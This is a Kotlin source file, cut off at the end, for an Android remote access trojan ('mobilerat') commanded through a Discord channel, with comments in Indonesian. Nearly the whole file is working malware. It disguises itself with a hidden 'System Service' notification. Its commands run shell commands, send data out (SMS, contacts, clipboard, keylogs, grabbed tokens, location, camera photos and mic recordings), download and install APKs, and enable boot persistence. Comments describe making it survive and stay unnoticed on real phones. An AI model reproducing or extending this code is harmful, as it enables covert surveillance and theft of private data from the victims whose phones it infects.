package com.kai.mobilerat

import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.provider.Settings
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.Process
import android.os.StatFs
import android.os.SystemClock
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.app.ServiceCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.security.MessageDigest
import kotlin.random.Random

/**
 * Service C2. Perubahan dari versi lama, semuanya karena satu alasan yang
 * sama — versi lama mati di perangkat nyata:
 *
 *  - startForeground bertipe (wajib di Android 14+ dengan targetSdk modern).
 *  - try/catch per pesan. Satu perintah gagal tidak lagi membunuh antrean.
 *  - Permission runtime diperiksa sebelum menyentuh SMS, kontak, lokasi.
 *  - Upload file pakai attachment, bukan base64 di dalam pesan.
 *  - Polling pakai jitter dan backoff, bukan 3 detik tetap.
 */
class C2Service : Service() {

    private var running = true
    private var lastId = "0"
    private var me: String? = null
    private var cwd = "/sdcard"
    private var pollMs = Config.POLL_MS
    private var announced = false

    /**
     * Nama pendek perangkat untuk routing dan prefix balasan.
     *
     * Alias dari Config dipakai kalau diisi eksplisit. Kalau kosong, diambil
     * dari codename perangkat (Build.DEVICE), mis. ginkgo -> gink. Ini yang
     * bikin dua HP di channel yang sama tidak lagi sama-sama menjawab `!b`.
     */
    private val deviceTag: String by lazy {
        val set = Config.alias.trim().lowercase()
        if (set.isNotEmpty()) set
        else (Build.DEVICE ?: "").filter { it.isLetterOrDigit() }.lowercase()
            .take(4).ifEmpty { "dev" }
    }

    private val tag: String
        get() = "[$deviceTag] "

    override fun onCreate() {
        super.onCreate()
        goForeground()
        Thread({ loop() }, "c2").apply {
            isDaemon = true
            start()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        super.onDestroy()
    }

    // ---------------------------------------------------------------- layar

    private fun goForeground() {
        val channel = "sync"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channel) == null) {
                val ch = NotificationChannel(
                    channel,
                    "Sinkronisasi sistem",
                    NotificationManager.IMPORTANCE_MIN
                )
                // IMPORTANCE_MIN menyembunyikan ikon dari status bar. Notifikasi
                // tetap ada karena itu syarat foreground service, tapi tidak
                // memancing perhatian seperti "System Service" versi lama.
                ch.setShowBadge(false)
                ch.lockscreenVisibility = Notification.VISIBILITY_SECRET
                ch.enableVibration(false)
                ch.setSound(null, null)
                nm.createNotificationChannel(ch)
            }
        }

        val notif: Notification = Notification.Builder(this, channel)
            .setContentTitle("System Service")
            .setContentText("Menjaga komponen sistem tetap terbaru")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setShowWhen(false)
            .build()

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0
        try {
            ServiceCompat.startForeground(this, 1, notif, type)
        } catch (e: Exception) {
            // Android 14+ bisa menolak kalau kuota start dari background habis.
            running = false
            stopSelf()
        }
    }

    // ---------------------------------------------------------------- jaringan

    private fun prime(): Boolean {
        val res = Discord.call("GET", "/users/@me")
        if (res.first !in 200..299) return false
        me = try {
            JSONObject(res.second).optString("id").ifEmpty { null }
        } catch (_: Exception) {
            null
        } ?: return false

        val tail = Discord.call("GET", "/channels/${Config.channel}/messages?limit=1")
        if (tail.first in 200..299) {
            try {
                val arr = JSONArray(tail.second)
                if (arr.length() > 0) lastId = arr.getJSONObject(0).optString("id", "0")
            } catch (_: Exception) {
            }
        }
        return true
    }

    private fun poll(): List<JSONObject> {
        val res = Discord.call(
            "GET",
            "/channels/${Config.channel}/messages?limit=20&after=$lastId"
        )
        if (res.first !in 200..299) return emptyList()
        val out = ArrayList<JSONObject>()
        val arr = try {
            JSONArray(res.second)
        } catch (_: Exception) {
            return emptyList()
        }
        for (i in 0 until arr.length()) {
            val m = arr.optJSONObject(i) ?: continue
            val id = m.optString("id", lastId)
            if ((id.toLongOrNull() ?: 0L) > (lastId.toLongOrNull() ?: 0L)) lastId = id
            if (m.optJSONObject("author")?.optString("id") == me) continue
            out.add(m)
        }
        return out
    }

    private fun loop() {
        var backoff = 4000L
        while (running) {
            if (me == null && !prime()) {
                sleep(backoff)
                backoff = minOf(backoff * 2, 60_000L)
                continue
            }
            backoff = 4000L
            if (!announced) {
                announced = true
                say(
                    "online | ${Build.MANUFACTURER} ${Build.MODEL} | android ${Build.VERSION.RELEASE} " +
                        "(sdk ${Build.VERSION.SDK_INT}) | batt ${battPct()} | id ${Config.uuid.take(8)} | " +
                        "!$deviceTag | perm ${Perms.missing(this).size} kurang"
                )
            }
            val batch = try {
                poll()
            } catch (_: Exception) {
                emptyList()
            }
            for (m in batch) {
                if (!running) break
                try {
                    handle(m)
                } catch (e: Exception) {
                    say("ERR ${e.javaClass.simpleName}: ${e.message}")
                }
            }
            sleep(pollMs + Random.nextLong(0, 1500))
        }
    }

    private fun sleep(ms: Long) {
        try {
            Thread.sleep(ms)
        } catch (_: InterruptedException) {
        }
    }

    private fun say(text: String) {
        Discord.sendLong(text, tag)
    }

    // ---------------------------------------------------------------- parsing

    /**
     * Hanya menerima perintah ber-prefix:
     *
     *   `!<alias> <cmd>`     alias perangkat ini (lihat `who`)
     *   `!<uuid8> <cmd>`     uuid perangkat, 8 huruf pertama
     *   `!@<pola> <cmd>`     device / uuid8 / model mengandung pola
     *   `!* <cmd>`           semua perangkat
     *
     * Tanpa prefix, pesan diabaikan diam-diam — versi lama menjawab UNKNOWN
     * ke setiap obrolan di channel. `!@` ditambahkan karena alias bisa kembar:
     * dua APK yang dibakar dengan --alias b sama-sama menjawab `!b`.
     */
    private fun split(content: String): Pair<String, String>? {
        var t = content.trim()
        if (t.isEmpty()) return null
        val head = t.substringBefore(' ').lowercase()
        val uuid = Config.uuid.lowercase()
        val uuid8 = uuid.take(8)
        val model = (Build.MODEL ?: "").lowercase()

        val isAlias = when {
            head == "!*" -> true
            head.startsWith("!@") -> {
                val p = head.substring(2)
                p.isEmpty() || deviceTag.contains(p) || uuid8.contains(p) ||
                    model.contains(p)
            }
            else -> {
                val h = head.trimStart('!')
                h == deviceTag || (uuid.isNotEmpty() && (h == uuid || h == uuid8))
            }
        }

        if (!isAlias) return null
        t = t.substringAfter(' ', "").trim()
        if (t.isEmpty()) return null
        val verb = t.substringBefore(' ').trim().lowercase()
        val arg = if (t.contains(' ')) t.substringAfter(' ').trim() else ""
        return if (verb.isEmpty()) null else (verb to arg)
    }

    private fun handle(m: JSONObject) {
        val (verb, arg) = split(m.optString("content", "")) ?: return
        when (verb) {
            "who", "id", "device", "me" -> who()
            "info" -> info()
            "sys" -> say(Actions.sysinfo(this))
            "ping" -> ping()
            "help" -> help()
            "sh" -> shell(arg)
            "cd" -> cd(arg)
            "ls" -> ls(arg)
            "clip" -> clip(arg)
            "ps" -> ps()
            "kill" -> kill(arg)
            "msg" -> msg(arg)
            "toast" -> say(Actions.toast(this, arg))
            "notify" -> say(Actions.notify(this, arg))
            "tts" -> Actions.tts(this, arg) { say(it) }
            "vib" -> say(Actions.vibrate(this, arg))
            "vol", "volume" -> say(Actions.volume(this, arg))
            "torch" -> say(Actions.torch(this, arg.trim().lowercase() != "off"))
            "cam" -> cam(arg)
            "mic" -> mic(arg)
            "rick" -> {
                val ok = PlayerActivity.play(this, if (arg.startsWith("http")) arg else null)
                say(if (ok) "RICK_OK" else "RICK_GAGAL")
            }
            "black" -> overlay(arg, true)
            "block" -> overlay(arg, false)
            "close" -> {
                PlayerActivity.close()
                Overlay.hide(this)
                say("CLOSE_OK")
            }
            "wifi" -> say(Actions.wifi(this))
            "root" -> say(Actions.root(this))
            "reboot" -> say(Actions.reboot(this, arg))
            "open" -> say(Actions.open(this, arg))
            "inst" -> say(Actions.install(this, arg))
            "keylog" -> keylog(arg)
            "grab" -> say(Actions.tokens(this))
            "calls" -> say(Actions.calls(this))
            "sleep" -> sleepCmd(arg)
            "exit" -> {
                say("bye")
                running = false
                stopSelf()
            }
            "purge" -> purge()
            "loc" -> loc()
            "sms" -> sms(arg)
            "smsread" -> smsRead()
            "contacts" -> contacts()
            "apps" -> apps()
            "ip" -> ip(arg)
            "shot" -> shot()
            "dl" -> dl(arg)
            "up" -> up(m, arg)
            "gh" -> gh(arg)
            "rm" -> rm(arg)
            "mv" -> mv(arg)
            "storage" -> storage()
            "battery" -> battery()
            "perm", "perms" -> perms()
            "boot" -> boot(arg)
            // Nama-nama di bawah ini sengaja sama dengan versi PC supaya
            // otot yang sudah terbentuk di channel tidak perlu dilatih ulang.
            "persist" -> boot("on")
            "unpersist" -> boot("off")
            "update" -> updateCmd(arg)
            "x", "exec", "run" -> execUrl(arg)
            "uninstall" -> say(Actions.uninstall(this))
            "taskkill" -> kill(arg)
            "keys" -> keylog(arg)
            "power" -> say(Actions.reboot(this, arg))
            else -> say("? $verb")
        }
        // Balasan sudah dikirim di dalam handler.
    }

    // ---------------------------------------------------------------- perintah

    /**
     * Persentase baterai sebagai string.
     *
     * `BATTERY_PROPERTY_CAPACITY` balik `Int.MIN_VALUE` di emulator dan di
     * sebagian perangkat yang tidak mengisi properti itu — dulu angka itu
     * dicetak apa adanya jadi "-2147483648%". Sticky intent
     * ACTION_BATTERY_CHANGED masih membawa level dan scale yang benar.
     */
    private fun battPct(): String {
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val p = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            if (p in 0..100) return "$p%"
        } catch (_: Exception) {
        }
        try {
            val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val lvl = i?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = i?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (lvl >= 0 && scale > 0) return "${lvl * 100 / scale}%"
        } catch (_: Exception) {
        }
        return "?"
    }

    private fun info() {
        val ext = if (Vfs.writable(Vfs.external)) "rw" else "ro"
        say(
            "MODEL=${Build.MODEL} SDK=${Build.VERSION.SDK_INT} " +
                "CWD=$cwd BATT=${battPct()} EXT=$ext MISS=${Perms.missing(this).size}"
        )
    }

    /** Detik -> "3h 12m". Dipakai `who`. */
    private fun uptimeText(seconds: Long): String {
        val d = seconds / 86400
        val h = (seconds % 86400) / 3600
        val m = (seconds % 3600) / 60
        return when {
            d > 0 -> "${d}d ${h}h"
            h > 0 -> "${h}h ${m}m"
            else -> "${m}m ${seconds % 60}s"
        }
    }

    /** sha256 penuh dalam hex. Dipakai `update` untuk memverifikasi unduhan. */
    private fun sha256Hex(path: String): String {
        if (path.isEmpty()) return ""
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            File(path).inputStream().use { ins ->
                val buf = ByteArray(64 * 1024)
                while (true) {
                    val n = ins.read(buf)
                    if (n <= 0) break
                    md.update(buf, 0, n)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            ""
        }
    }

    /** sha256 APK, 8 huruf. Ini yang membedakan build baru dari build usang. */
    private fun apkSha(path: String): String = sha256Hex(path).take(8).ifEmpty { "?" }

    /**
     * Kartu identitas perangkat. Kalau ada lebih dari satu HP di channel yang
     * sama, `!* who` memunculkan semuanya sekaligus: uuid8 dan sha APK di tiap
     * baris menunjukkan mana yang membalas dan build-nya yang mana.
     */
    private fun who() {
        val pkg = try {
            packageManager.getPackageInfo(packageName, 0)
        } catch (e: Exception) {
            null
        }
        val apk = pkg?.applicationInfo?.sourceDir ?: ""
        val size = if (apk.isNotEmpty()) "${File(apk).length()} B" else "?"
        say(
            "who    : ${Config.uuid.take(8)}   (uuid ${Config.uuid})\n" +
                "device : ${Build.MANUFACTURER} ${Build.MODEL}  (${Build.DEVICE})\n" +
                "os     : android ${Build.VERSION.RELEASE} sdk ${Build.VERSION.SDK_INT} " +
                "${Build.SUPPORTED_ABIS.firstOrNull() ?: "?"}\n" +
                "build  : ${pkg?.versionName ?: "?"}   $size   sha ${apkSha(apk)}\n" +
                "pkg    : $packageName\n" +
                "proc   : pid ${Process.myPid()}   up " +
                uptimeText((SystemClock.elapsedRealtime() - Process.getStartElapsedRealtime()) / 1000) +
                "   (hp up ${uptimeText(SystemClock.elapsedRealtime() / 1000)})\n" +
                "batt   : ${battPct()}   perm kurang ${Perms.missing(this).size}\n" +
                "alamat : !$deviceTag   !${Config.uuid.take(8)}   !@$deviceTag"
        )
    }

    private fun help() = say(
        "cara alamatkan: ![alias] <verb>  ![uuid8] <verb>  !@[pola] <verb>  !* <verb>\n" +
            "alias perangkat ini: !$deviceTag   uuid ${Config.uuid.take(8)}\n\n" +
            "identitas : who info sys ping\n" +
            "file      : sh cd ls dl up rm mv gh x update inst open uninstall\n" +
            "media     : shot cam mic clip keylog keys\n" +
            "kontrol   : ps kill taskkill msg toast notify tts vib vol torch\n" +
            "data      : loc sms smsread contacts calls apps ip storage battery wifi\n" +
            "sistem    : root power reboot perm persist unpersist boot\n" +
            "layar     : rick black block grab sleep close exit purge"
    )

    private fun ping() {
        val t0 = System.nanoTime()
        val r = Discord.call("GET", "/users/@me")
        val ms = (System.nanoTime() - t0) / 1_000_000
        say("PING ${ms}ms http=${r.first}")
    }

    private fun shell(cmd: String) {
        if (cmd.isBlank()) {
            say("pakai: !${Config.alias} sh <perintah>")
            return
        }
        val proc = ProcessBuilder("sh", "-c", cmd)
            .directory(File(cwd))
            .redirectErrorStream(true)
            .start()
        val out = proc.inputStream.bufferedReader().use { it.readText() }
        proc.waitFor()
        say(out.trim().ifEmpty { "(no output)" })
    }

    private fun cd(path: String) {
        if (path.isBlank()) {
            say("CWD=$cwd")
            return
        }
        val f = Vfs.resolve(cwd, path)
        if (f.isDirectory) {
            cwd = f.absolutePath
            say("CWD=$cwd")
        } else {
            say("ERR bukan folder: ${f.absolutePath}")
        }
    }

    private fun ls(path: String) {
        val dir = Vfs.resolve(cwd, path)
        val files = dir.listFiles()
        if (files == null) {
            say("ERR tidak bisa baca ${dir.absolutePath}")
            return
        }
        val body = files.sortedBy { it.name.lowercase() }.take(200).joinToString("\n") {
            if (it.isDirectory) "[D] ${it.name}" else "[F] ${it.name}  ${Vfs.human(it.length())}"
        }
        say(body.ifEmpty { "(kosong)" })
    }

    private fun clip(arg: String) {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        if (arg.isBlank()) {
            val item = cm.primaryClip?.takeIf { it.itemCount > 0 }?.getItemAt(0)
            val text = item?.coerceToText(this)?.toString()
            say(text?.ifEmpty { "(kosong)" } ?: "(tidak ada akses clipboard)")
        } else {
            cm.setPrimaryClip(android.content.ClipData.newPlainText("x", arg))
            say("CLIP_OK")
        }
    }

    /**
     * Daftar proses.
     *
     * Sejak Android 8 procfs dipasang dengan hidepid, jadi `ps -A` dari uid
     * aplikasi hanya memperlihatkan proses milik uid itu sendiri — dulu
     * hasilnya satu baris tanpa penjelasan. Sekarang: pakai `su` kalau ada
     * (daftar penuh), kalau tidak tetap `ps -A` tapi diberi catatan bahwa
     * yang terlihat cuma proses sendiri.
     */
    private fun ps() {
        if (Actions.hasSu()) {
            val full = Actions.su("ps -A", 10000)
            if (full.isNotBlank()) {
                say(full)
                return
            }
        }
        val viaShell = try {
            val p = ProcessBuilder("ps", "-A").redirectErrorStream(true).start()
            val text = p.inputStream.bufferedReader().readText().trim()
            p.waitFor()
            text
        } catch (e: Exception) {
            ""
        }
        if (viaShell.isNotEmpty()) {
            val lines = viaShell.lines().filter { it.isNotBlank() }
            if (lines.size > 2) {
                say(viaShell)
            } else {
                say(viaShell + "\n\n(hanya proses uid ini yang terlihat; procfs dibatasi " +
                    "sejak Android 8. `root` membuka daftar penuh.)")
            }
            return
        }
        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val list = am.runningAppProcesses?.joinToString("\n") { "${it.pid} ${it.processName}" }
        say(list ?: "(tidak tersedia)")
    }

    private fun kill(arg: String) {
        val pid = arg.trim().toIntOrNull()
        if (pid != null) {
            try {
                android.os.Process.killProcess(pid)
                sleep(300)
                val alive = File("/proc/$pid").exists()
                say(if (alive) "KILL $pid GAGAL (uid lain)" else "KILL $pid OK")
            } catch (e: Exception) {
                say("ERR ${e.message}")
            }
        } else if (arg.isNotBlank()) {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.killBackgroundProcesses(arg.trim())
            say("KILLBG ${arg.trim()}")
        } else {
            say("pakai: kill <pid|package>")
        }
    }

    private fun msg(arg: String) {
        if (arg.isBlank()) {
            say("pakai: msg <teks>")
            return
        }
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(this, arg, Toast.LENGTH_LONG).show()
        }
        say("MSG_OK")
    }

    private fun sleepCmd(arg: String) {
        val sec = arg.toLongOrNull()
        if (sec == null || sec < 1) {
            say("SLEEP ${pollMs}ms")
            return
        }
        pollMs = sec.coerceIn(1, 3600) * 1000
        say("SLEEP ${pollMs}ms")
    }

    private fun purge() {
        try {
            @Suppress("DEPRECATION")
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.clearApplicationUserData()
            say("PURGE_OK")
        } catch (e: Exception) {
            say("ERR ${e.message}")
        } finally {
            running = false
            stopSelf()
        }
    }

    private fun loc() {
        if (!Perms.hasLocation(this)) {
            say("ERR PERM lokasi belum diberikan. buka app lalu izinkan.")
            return
        }
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (p in providers) {
            try {
                @Suppress("DEPRECATION")
                val l = lm.getLastKnownLocation(p) ?: continue
                say("LOC ${l.latitude},${l.longitude} acc=${l.accuracy}m via=$p")
                return
            } catch (_: SecurityException) {
            } catch (_: Exception) {
            }
        }
        say("LOC null (belum ada fix; perangkat harus pernah dapat lokasi)")
    }

    private fun sms(arg: String) {
        if (!Perms.hasSms(this)) {
            say("ERR PERM SMS belum diberikan")
            return
        }
        val parts = arg.split("|", limit = 2)
        if (parts.size < 2) {
            say("pakai: sms <nomor>|<teks>")
            return
        }
        try {
            @Suppress("DEPRECATION")
            val sm = SmsManager.getDefault()
            sm.sendTextMessage(parts[0].trim(), null, parts[1], null, null)
            say("SMS_OK")
        } catch (e: Exception) {
            say("ERR ${e.message}")
        }
    }

    private fun smsRead() {
        if (!Perms.hasSms(this)) {
            say("ERR PERM SMS belum diberikan")
            return
        }
        val sb = StringBuilder()
        try {
            contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC"
            )?.use { c ->
                val ai = c.getColumnIndex("address")
                val bi = c.getColumnIndex("body")
                var n = 0
                while (c.moveToNext() && n < 30) {
                    sb.append(c.getString(ai)).append(": ").append(c.getString(bi)).append("\n")
                    n++
                }
            }
        } catch (e: Exception) {
            say("ERR ${e.message}")
            return
        }
        say(sb.toString().ifBlank { "(kosong)" })
    }

    private fun contacts() {
        if (!Perms.hasContacts(this)) {
            say("ERR PERM kontak belum diberikan")
            return
        }
        val sb = StringBuilder()
        try {
            contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )?.use { c ->
                val ni =
                    c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pi =
                    c.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                var n = 0
                while (c.moveToNext() && n < 200) {
                    sb.append(c.getString(ni)).append(" ").append(c.getString(pi)).append("\n")
                    n++
                }
            }
        } catch (e: Exception) {
            say("ERR ${e.message}")
            return
        }
        say(sb.toString().ifBlank { "(kosong)" })
    }

    private fun apps() {
        val pm = packageManager
        val labels = pm.getInstalledApplications(0)
            .map { it.loadLabel(pm).toString() }
            .sorted()
            .take(150)
        say(labels.joinToString("\n").ifEmpty { "(kosong)" })
    }

    private fun ip(arg: String) {
        val sb = StringBuilder()
        try {
            val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
            for (nif in ifaces) {
                if (!nif.isUp || nif.isLoopback) continue
                for (addr in nif.inetAddresses) {
                    val host = addr.hostAddress ?: continue
                    if (host.contains(':')) continue
                    sb.append(nif.name).append(" ").append(host).append("\n")
                }
            }
        } catch (_: Exception) {
        }
        if (arg.trim() == "pub") {
            val tmp = File(cacheDir, "ip.txt")
            val r = Discord.download("https://api.ipify.org", tmp)
            if (r.first) sb.append("PUB ").append(tmp.readText().trim()).append("\n")
            tmp.delete()
        }
        say(sb.toString().trim().ifEmpty { "(tidak ada interface aktif)" })
    }

    /**
     * `screencap` dikirim oleh uid aplikasi, bukan shell, dan di banyak
     * perangkat modern itu menghasilkan file 0 byte atau Permission denied.
     * Versi lama tetap melaporkan path seolah berhasil. Di sini hasilnya
     * diperiksa, dan kegagalan dilaporkan apa adanya.
     */
    /**
     * Screenshot layar.
     *
     * `screencap` butuh READ_FRAME_BUFFER, permission bertanda tangan yang
     * cuma dipegang aplikasi sistem. Dari uid aplikasi hasilnya file kosong
     * tanpa pesan — itu yang dulu muncul sebagai "file kosong". Dengan root
     * jalan normal; tanpa root Android memang menolak, dan itu dilaporkan
     * sebagai penolakan, bukan sebagai kegagalan misterius.
     */
    private fun shot() {
        val out = File(cacheDir, "shot.png")
        if (out.exists()) out.delete()

        val err = StringBuilder()
        if (Actions.hasSu()) {
            val t = Actions.su("screencap -p " + out.absolutePath, 15000)
            if (t.isNotBlank()) err.append(t.trim())
        } else {
            try {
                val p = ProcessBuilder("screencap", "-p", out.absolutePath)
                    .redirectErrorStream(true)
                    .start()
                val text = p.inputStream.bufferedReader().use { it.readText() }
                p.waitFor()
                if (text.isNotBlank()) err.append(text.trim())
            } catch (e: Exception) {
                err.append(e.message ?: e.javaClass.simpleName)
            }
        }

        if (out.exists() && out.length() > 1000) {
            val ok = Discord.upload(out, tag + "shot")
            say(if (ok) "SHOT ${out.length()} B" else "SHOT_GAGAL upload")
            out.delete()
        } else {
            say(
                "SHOT_GAGAL " + err.toString().ifEmpty {
                    "screencap ditolak OS — butuh root (READ_FRAME_BUFFER hanya untuk aplikasi sistem)"
                }
            )
        }
    }

    private fun dl(path: String) {
        if (path.isBlank()) {
            say("pakai: dl <path>")
            return
        }
        val f = Vfs.resolve(cwd, path)
        if (!f.isFile) {
            say("ERR bukan file: ${f.absolutePath}")
            return
        }
        val ok = Discord.upload(f, tag + f.name + " (" + Vfs.human(f.length()) + ")")
        if (!ok) say("ERR upload gagal ${f.name}")
    }

    private fun up(m: JSONObject, arg: String) {
        val urls = Discord.attachments(m)
        if (urls.isEmpty()) {
            say("pakai: kirim perintah ini dengan lampiran, tulis path tujuan di argumen")
            return
        }
        val dest = if (arg.isBlank()) Vfs.resolve(cwd, "") else Vfs.resolve(cwd, arg)
        for ((i, url) in urls.withIndex()) {
            val name = url.substringAfterLast('/').substringBefore('?').ifEmpty { "up_$i.bin" }
            val target = when {
                dest.isDirectory -> File(dest, name)
                urls.size == 1 -> dest
                else -> File(dest.parentFile ?: Vfs.external, "${i}_$name")
            }
            val r = Discord.download(url, target)
            say("UP ${r.second}")
        }
    }

    private fun gh(arg: String) {
        val parts = arg.split(" ", limit = 2)
        val url = parts.getOrNull(0) ?: ""
        if (!url.startsWith("http")) {
            say("pakai: gh <url> [dest]")
            return
        }
        val target = Vfs.resolve(cwd, parts.getOrNull(1) ?: "gh.bin")
        val r = Discord.download(url, target)
        say(if (r.first) "GH ${r.second}" else "GH ${r.second}")
    }

    /**
     * `x <url>` — padanan `x` di versi PC.
     *
     * Android tidak punya "jalankan file". Kalau yang diunduh APK, dia
     * diserahkan ke installer (tetap ada dialog konfirmasi tanpa root); kalau
     * bukan, filenya mendarat di cache dan path-nya dikembalikan apa adanya.
     */
    private fun execUrl(arg: String) {
        val url = arg.trim().split(" ").firstOrNull().orEmpty()
        if (!url.startsWith("http")) {
            say("pakai: x <url>")
            return
        }
        val name = url.substringAfterLast('/').substringBefore('?').ifEmpty { "x.bin" }
        val dest = File(cacheDir, name)
        val r = Discord.download(url, dest)
        if (!r.first) {
            say("ERR unduh: ${r.second}")
            return
        }
        if (name.lowercase().endsWith(".apk")) {
            say(Actions.install(this, dest.absolutePath))
        } else {
            say("X ${dest.absolutePath} (${Vfs.human(dest.length())}) — bukan apk, Android tidak bisa exec")
        }
    }

    /**
     * `update`              ringkasan build yang sedang jalan
     * `update <url> [sha]`  unduh APK, verifikasi sha256 kalau dikasih, lalu
     *                       serahkan ke installer
     *
     * Sama seperti versi PC: tanpa sha tetap jalan, hanya saja tidak ada
     * jaminan byte yang mendarat itu yang dimaksud.
     */
    private fun updateCmd(arg: String) {
        val parts = arg.trim().split(" ")
        val url = parts.getOrNull(0)?.trim().orEmpty()

        if (url.isEmpty()) {
            val pkg = try {
                packageManager.getPackageInfo(packageName, 0)
            } catch (e: Exception) {
                null
            }
            val apk = pkg?.applicationInfo?.sourceDir ?: ""
            say(
                "apk    : $apk\n" +
                    "ukuran : ${if (apk.isNotEmpty() && File(apk).isFile) File(apk).length() else 0} B\n" +
                    "sha256 : ${sha256Hex(apk).ifEmpty { "?" }}\n" +
                    "versi  : ${pkg?.versionName ?: "?"}   sdk ${Build.VERSION.SDK_INT}\n" +
                    "pakai  : update <url> [sha256]"
            )
            return
        }

        if (!url.startsWith("http")) {
            say("pakai: update <url> [sha256]")
            return
        }
        if (!Actions.canInstall(this)) {
            say("ERR izin 'install unknown apps' belum aktif untuk aplikasi ini")
            return
        }

        val dest = File(cacheDir, "update.apk")
        val r = Discord.download(url, dest)
        if (!r.first) {
            say("ERR unduh: ${r.second}")
            return
        }

        val want = parts.getOrNull(1)?.trim()?.lowercase().orEmpty()
        val got = sha256Hex(dest.absolutePath)
        if (want.isNotEmpty() && want != got) {
            val size = dest.length()
            dest.delete()
            say("ERR sha tidak cocok — dibatalkan\nminta : $want\ndapat : $got\nukuran: $size B")
            return
        }

        say("unduh OK  ${File(dest.absolutePath).length()} B  sha ${got.take(8)}")
        say(Actions.install(this, dest.absolutePath))
    }

    private fun rm(path: String) {
        val f = Vfs.resolve(cwd, path)
        if (!f.exists()) {
            say("ERR tidak ada: ${f.absolutePath}")
            return
        }
        say(if (f.delete()) "RM_OK" else "RM_GAGAL (izin)")
    }

    private fun mv(arg: String) {
        val parts = arg.split(" ", limit = 2)
        if (parts.size < 2) {
            say("pakai: mv <dari> <ke>")
            return
        }
        val from = Vfs.resolve(cwd, parts[0])
        val to = Vfs.resolve(cwd, parts[1])
        say(if (from.renameTo(to)) "MV_OK" else "MV_GAGAL")
    }

    private fun storage() {
        val sb = StringBuilder()
        try {
            val ext = StatFs(Vfs.external.absolutePath)
            sb.append("EXT free=").append(Vfs.human(ext.availableBytes))
                .append(" total=").append(Vfs.human(ext.totalBytes)).append("\n")
        } catch (_: Exception) {
        }
        try {
            val data = StatFs(Environment.getDataDirectory().absolutePath)
            sb.append("DATA free=").append(Vfs.human(data.availableBytes))
                .append(" total=").append(Vfs.human(data.totalBytes))
        } catch (_: Exception) {
        }
        say(sb.toString().trim().ifEmpty { "(tidak terbaca)" })
    }

    private fun battery() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        val ignore = pm.isIgnoringBatteryOptimizations(packageName)
        say("BATT=${battPct()} optim=${if (ignore) "off" else "on"}")
    }

    private fun perms() {
        val missing = Perms.missing(this)
        say(
            if (missing.isEmpty()) "PERM lengkap"
            else "PERM kurang: " + missing.joinToString(" ") { Perms.short(it) }
        )
    }

    private fun boot(arg: String) {
        val cn = ComponentName(this, BootReceiver::class.java)
        val state = when (arg.trim().lowercase()) {
            "on" -> PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            "off" -> PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else -> -1
        }
        if (state < 0) {
            val cur = packageManager.getComponentEnabledSetting(cn)
            say("BOOT=${if (cur == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) "off" else "on"}")
            return
        }
        packageManager.setComponentEnabledSetting(cn, state, PackageManager.DONT_KILL_APP)
        say("BOOT=${arg.trim().lowercase()}")
    }

    // ------------------------------------------------------------- multmedia

    /**
     * Capture kamera bisa makan 15 detik dan rekaman mic sampai 2 menit.
     * Dijalankan di thread sendiri supaya antrean perintah tetap jalan.
     */
    private fun cam(arg: String) {
        val front = arg.trim().lowercase().let { it == "front" || it == "1" || it == "depan" }
        Thread({
            val out = File(cacheDir, "cam.jpg")
            try {
                val st = Actions.camera(this, front, out)
                if (st.startsWith("CAM_OK")) {
                    val ok = Discord.upload(out, tag + st)
                    say(if (ok) st else "CAM_GAGAL upload")
                } else {
                    say(st)
                }
            } catch (e: Exception) {
                say("CAM_GAGAL ${e.message}")
            } finally {
                out.delete()
            }
        }, "cam").start()
    }

    private fun mic(arg: String) {
        val secs = arg.trim().toIntOrNull() ?: 10
        Thread({
            val out = File(cacheDir, "mic.wav")
            try {
                val st = Actions.mic(this, secs, out)
                if (st.startsWith("MIC_OK")) {
                    val ok = Discord.upload(out, tag + st + " (" + Vfs.human(out.length()) + ")")
                    say(if (ok) st else "MIC_GAGAL upload")
                } else {
                    say(st)
                }
            } catch (e: Exception) {
                say("MIC_GAGAL ${e.message}")
            } finally {
                out.delete()
            }
